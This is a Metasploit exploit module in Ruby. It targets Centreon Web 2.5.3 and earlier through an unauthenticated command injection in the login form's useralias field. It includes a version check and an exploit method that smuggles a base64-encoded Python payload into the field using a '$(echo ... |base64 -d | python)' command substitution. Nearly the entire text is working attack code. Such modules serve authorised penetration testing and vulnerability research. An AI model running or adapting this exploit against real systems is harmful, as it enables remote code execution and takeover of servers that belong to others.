## This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient
 
  Rank = ExcellentRanking
  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;        => &#039;Centreon Web Useralias Command Execution&#039;,
        &#039;Description&#039; => %q(
          Centreon Web Interface <= 2.5.3 utilizes an ECHO for logging SQL
          errors.  This functionality can be abused for arbitrary code
          execution, and can be triggered via the login screen prior to
          authentication.
        ),
        &#039;Author&#039;      =>
          [
            &#039;h00die <mike@shorebreaksecurity.com>&#039;,         # module
            &#039;Nicolas CHATELAIN <n.chatelain@sysdream.com>&#039;  # discovery
          ],
        &#039;References&#039;  =>
          [
            [ &#039;EDB&#039;, &#039;39501&#039; ]
          ],
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Platform&#039;       => [&#039;python&#039;],
        &#039;Privileged&#039;     => false,
        &#039;Arch&#039;           => ARCH_PYTHON,
        &#039;Targets&#039;        =>
          [
            [ &#039;Automatic Target&#039;, {}]
          ],
        &#039;DefaultTarget&#039; => 0,
        &#039;DisclosureDate&#039; => &#039;Feb 26 2016&#039;
      )
    )
 
    register_options(
      [
        Opt::RPORT(80),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The URI of the Centreon Application&#039;, &#039;/centreon/&#039;])
      ], self.class
    )
  end
 
  def check
    begin
      res = send_request_cgi(
        &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;method&#039;    => &#039;GET&#039;
      )
      /LoginInvitVersion"><br \/>[\s]+(?<version>[\d]{1,2}\.[\d]{1,2}\.[\d]{1,2})[\s]+<\/td>/ =~ res.body
 
      if version && Gem::Version.new(version) <= Gem::Version.new(&#039;2.5.3&#039;)
        vprint_good("Version Detected: #{version}")
        Exploit::CheckCode::Appears
      else
        Exploit::CheckCode::Safe
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
  end
 
  def exploit
    begin
      vprint_status(&#039;Sending malicious login&#039;)
      send_request_cgi(
        &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_post&#039;  =>
        {
          &#039;useralias&#039;   => "$(echo #{Rex::Text.encode_base64(payload.encoded)} |base64 -d | python)\\",
          &#039;password&#039;    => Rex::Text.rand_text_alpha(5)
        }
      )
 
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
  end
end

